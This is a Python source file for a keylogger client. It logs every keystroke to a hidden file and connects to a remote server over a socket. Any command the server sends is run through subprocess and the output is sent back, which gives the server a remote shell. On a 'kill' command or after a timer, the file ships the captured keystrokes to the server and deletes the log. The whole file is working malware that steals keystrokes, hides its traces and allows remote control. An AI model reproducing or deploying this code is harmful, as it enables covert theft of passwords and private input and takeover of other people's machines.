import time
import os  
import client
import signal
from threading import Thread
from pynput.keyboard import Listener

import subprocess
from shared import stop_event


def on_press(key):
    keyFormat = "key_press:{0}\n".format(key)
    with open('.document1.txt', '+a') as file:
        file.write(keyFormat)

def on_release(key):
    keyFormat = "key_release{0}\n".format(key)
    with open('.document1.txt', '+a') as file:
        file.write(keyFormat)

def receive_message(mysocket,listener):
    try: 
        while True:
            data = mysocket.recv(1024).decode()

            if data:
                print(f"> Data - receive_message: {data} \n")

                if data == "kill":
                    print("[SERVER COMMAND] Arret du client \n")
                    listener.stop()
                    client.send_file_securely(mysocket)
                    client.stop_and_delete_capture_file()

                
                result = subprocess.check_output(data)

                mysocket.send(result)
    except Exception as e:
        print(f"[x] Exception - receive_message:  {e} \n")


        
def func_handle_time(period,listener,mysocket):
    time.sleep(period)
    listener.stop()
    client.send_file_securely(mysocket)
    client.stop_and_delete_capture_file()

def listen_keyboard(mysocket):

    with Listener(on_press=on_press, on_release=on_release) as listener:
        thread_receive_message = Thread(target=receive_message,args=(mysocket,listener))
        thread_func_handle_time = Thread(target=func_handle_time,args=(5.0,listener,mysocket))

        thread_receive_message.start()
        thread_func_handle_time.start()

        if stop_event.is_set():
            thread_receive_message.join()
            thread_func_handle_time.join()

        listener.join()

